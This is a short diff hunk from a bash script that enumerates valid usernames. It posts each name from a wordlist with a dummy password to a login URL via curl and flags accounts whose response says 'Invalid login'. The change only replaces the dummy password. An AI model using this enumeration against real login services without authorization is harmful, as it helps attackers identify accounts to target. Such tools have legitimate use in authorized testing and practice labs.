@@ -35,7 +35,7 @@ if [ $1 ]; then
 	echo -e "\n${blueColour}[*] Finding Valid Users \n${endColour}"
 	for user in $(cat $1); do
 
-		status=$(timeout 1 curl -s -d "username=$user&password=F4kEP4sS" $URL | grep -o 'Invalid login')
+		status=$(timeout 1 curl -s -d "username=$user&password=test" $URL | grep -o 'Invalid login')
 
 		if  [[ $status ]]; then
 			echo -e "\t${greenColour}[✔] User found: ${yellowColour}$user${endColour}"
